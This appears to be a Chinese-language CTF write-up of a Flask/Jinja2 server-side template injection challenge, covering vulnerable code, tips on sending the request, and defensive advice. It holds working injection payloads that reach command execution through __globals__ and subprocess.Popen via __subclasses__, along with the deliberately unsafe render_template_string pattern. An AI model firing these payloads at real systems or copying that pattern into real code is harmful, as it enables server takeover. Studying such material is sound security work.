漏洞成因源码（容器内 /app/server.py）
@app.route('/') def index(): password = request.args.get("password") or "" template = ''' %s % (password) return render_template_string(template)
高频辨析：两个 API 的安全性天差地别
render_template("x.html", ...) 渲染文件模板，输入作为数据传入，不参与解析 → 安全； render_template_string(str) 把字符串当模板源码渲染，用户输入混入即注入点 → 危险！

一句话背下整条链
Python 中任何函数对象都有 __globals__，它指向函数所在模块的全局命名空间字典 —— 模块 import 过 os，就能 函数.__globals__["os"].popen("id").read() 执行命令并读回显。

通用链与引号细节
通用链：{{"".__class__.__mro__[1].__subclasses__()}} 列出所有已加载类，找 subprocess.Popen 下标 N，再 __subclasses__()[N]("id", shell=True, stdout=-1).communicate()。
双引号优先：["os"] 用双引号，很多题过滤单引号（本题实测单双均可）。

六、易错点与防御视角

血泪教训（考场浪费时间实录）
坑 正确做法
--data-urlencode '{{7*7}}' 不带参数名，payload 变成参数名，全返回空，误判"被过滤" 必须写 --data-urlencode 'password={{7*7}}'，先确认参数名再发包
POST 提交 → 405 Method Not Allowed 看响应头 Allow: HEAD, GET, OPTIONS，换 GET 带参
一步到位打 RCE 失败就以为漏洞不存在 分步验证：{{7*7}} → {{lipsum}} → __globals__ → popen，每步定位断点
防御视角（面试/复盘考点）
用 render_template（文件模板）替代 render_template_string 渲染用户输入
必须拼接时，对 {{ }}、{% %}、{# #} 转义或白名单校验
模板引擎开启沙箱（Jinja2 sandboxed environment）
